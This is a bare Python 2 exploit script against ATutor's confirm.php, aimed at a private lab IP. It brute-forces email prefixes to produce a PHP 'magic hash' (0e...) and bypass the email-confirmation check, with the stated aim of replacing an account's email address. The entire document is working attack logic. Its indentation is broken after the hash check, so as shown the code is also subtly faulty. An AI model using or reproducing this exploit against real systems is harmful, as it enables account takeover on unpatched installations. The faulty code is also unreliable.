import requests,sys,string,itertools,hashlib,re
data="2016-03-22 10:02:26"
id ="1"
e = sys.argv[1]
count =0 
chars=string.lowercase + string.digits
for words in itertools.imap(''.join, itertools.product(chars,repeat=8)):
        hash=hashlib.md5("%s@%s" % (words,e) + data + id).hexdigest()[:10]
        if re.match(r'0+[eE]+\d+$',hash):
        url = "http://192.168.11.135/ATutor/confirm.php?id=1&m=0&e=%s@%s" % (words,e)
        print url
        r=requests.get(url,allow_redirects=False)
        if (r.status_code==302):
            print "(+)Will be replace into this new email " + words + "@" + e
            print "(+)Php say 0 == %s "% hash
            break
